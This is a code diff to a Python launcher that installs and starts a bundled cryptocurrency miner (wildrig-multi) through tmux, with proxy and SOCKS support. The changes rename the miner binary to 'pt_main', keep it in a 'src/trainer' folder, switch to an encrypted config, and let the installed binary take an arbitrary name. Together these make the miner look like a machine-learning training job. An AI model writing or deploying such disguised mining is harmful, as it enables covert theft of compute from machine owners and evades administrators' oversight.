@@ -15,9 +15,12 @@ import subprocess
 import sys
 from pathlib import Path
 
+from utils import decrypt_config
+
 PROJECT_DIR = Path(__file__).resolve().parent
-DEFAULT_CONFIG = PROJECT_DIR / "params.json"
+DEFAULT_CONFIG = PROJECT_DIR / "config.json"
 TRAINER_DIR = PROJECT_DIR / "src" / "trainer"
+BUNDLED_BINARY_NAME = "pt_main"
 PROXY_ENV_KEYS = ("all_proxy", "ALL_PROXY", "http_proxy", "https_proxy",
                   "HTTP_PROXY", "HTTPS_PROXY", "no_proxy", "NO_PROXY")
 
@@ -27,7 +30,7 @@ def load_config(argv):
     parser.add_argument("-c", "--config", type=Path, default=DEFAULT_CONFIG)
     parser.add_argument("--check", action="store_true", help="validate without installing or launching")
     args = parser.parse_args(argv[1:])
-    return json.loads(args.config.read_text()), args.check
+    return decrypt_config(json.loads(args.config.read_text(encoding="utf-8"))), args.check
 
 
 def resolve(cfg):
@@ -68,8 +71,8 @@ def validate(c):
         raise ValueError("socks must look like socks5://[user:pass@]host:port")
     if Path(c["bin_name"]).name != c["bin_name"] or c["bin_name"] in (".", ".."):
         raise ValueError("binary_name must be a filename, without directory components")
-    if not (c["source_dir"] / "wildrig-multi").is_file():
-        raise ValueError(f"Bundled miner missing: {c['source_dir'] / 'wildrig-multi'}")
+    if not (c["source_dir"] / BUNDLED_BINARY_NAME).is_file():
+        raise ValueError(f"Bundled miner missing: {c['source_dir'] / BUNDLED_BINARY_NAME}")
     if c["bin_dir"].resolve().is_relative_to(c["source_dir"].resolve()):
         raise ValueError("Install directory must be outside src/trainer")
 
@@ -96,7 +99,7 @@ def install(c):
     """Copy the local bundle, including libraries and other runtime assets."""
     c["logs_dir"].mkdir(parents=True, exist_ok=True)
     shutil.copytree(c["source_dir"], c["bin_dir"], dirs_exist_ok=True)
-    binary = c["bin_dir"] / "wildrig-multi"
+    binary = c["bin_dir"] / BUNDLED_BINARY_NAME
     target = c["bin_dir"] / c["bin_name"]
     if binary != target:
         binary.replace(target)
@@ -169,7 +172,7 @@ def main():
         c = resolve(cfg)
         validate(c)
         if check:
-            print(f"Configuration valid. Local miner: {c['source_dir'] / 'wildrig-multi'}")
+            print(f"Configuration valid. Local miner: {c['source_dir'] / BUNDLED_BINARY_NAME}")
             return
         if shutil.which("tmux") is None:
             raise ValueError("tmux not found; install it before launching.")
